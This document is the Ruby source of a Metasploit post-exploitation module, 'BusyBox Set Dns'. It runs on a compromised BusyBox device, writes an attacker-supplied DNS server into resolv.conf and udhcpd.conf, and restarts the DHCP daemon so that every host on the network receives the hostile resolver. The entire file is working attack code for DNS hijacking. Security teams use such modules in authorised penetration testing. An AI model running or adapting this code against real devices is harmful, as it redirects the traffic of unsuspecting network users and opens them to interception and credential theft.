##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Busybox

  def initialize
    super(
      'Name'         => 'BusyBox Set Dns',
      'Description'  => 'This module will be applied on a session connected
                         to a BusyBox sh shell. The script will set dns addresses
                         to the router or device executing BusyBox to be sent
                         by dhcp server to network hosts.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
       'SessionTypes'  => ['shell']
    )

    register_options(
      [
        OptAddress.new('SRVHOST',   [ true, "The dns server address.", nil ])
      ], self.class)
  end

  #
  #The module tries to update resolv.conf file with the SRVHOST dns address. It tries to update
  #udhcpd.conf too, with SRVHOST dns address, that should be given to network's hosts via dhcp
  #
  def run
    workdone = false
    vprint_status("Searching for files to modify dns server.")
    if file_exists("/etc/resolv.conf")
      vprint_status("Resolv.conf found.")
      if is_writable_and_write("/etc/resolv.conf", "nameserver #{datastore['SRVHOST']}", false)
        print_good("Dns server added to resolv.conf.")
        workdone = true
      end
    end
    if file_exists("/etc/udhcpd.conf")
      vprint_status("Udhcpd.conf found.")
      original_content = read_file("/etc/udhcpd.conf")
      vprint_status("Original udhcpd.conf content:")
      vprint_status(original_content)
      if is_writable_and_write("/etc/udhcpd.conf", "option dns #{datastore['SRVHOST']}", false)
        vprint_status("Udhcpd.conf is writable.")
        is_writable_and_write("/etc/udhcpd.conf", original_content, true)
        vprint_status("Relaunching udhcp server:")
        cmd_exec("killall dhcpd\n")
        cmd_exec("dhcpd /etc/udhcpd.conf &\n")
        print_good("Udhcpd.conf modified and dns server added. Dhcpd restarted.")
      else
        vprint_status("Unable to write udhcpd.conf. Trying to copy the file to a writable directory.")
        writable_directory = get_writable_directory()
        if writable_directory
          vprint_status("writable directory found, creating a copy of the original udhcpd.conf.")
          is_writable_and_write("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", false)
          is_writable_and_write("#{writable_directory}tmp.conf", original_content, true)
          vprint_status("Relaunching udhcp server:")
          cmd_exec("killall dhcpd\n")
          cmd_exec("dhcpd #{writable_directory}tmp.conf &\n")
          print_good("Udhcpd.conf copied to writable directory and dns server added. Dhcpd restarted.")
          workdone = true
        else
          vprint_error("Writable directory not found.")
        end
      end
    end
    if !workdone
      print_error("Unable to modify dns server.")
    end
  end

end
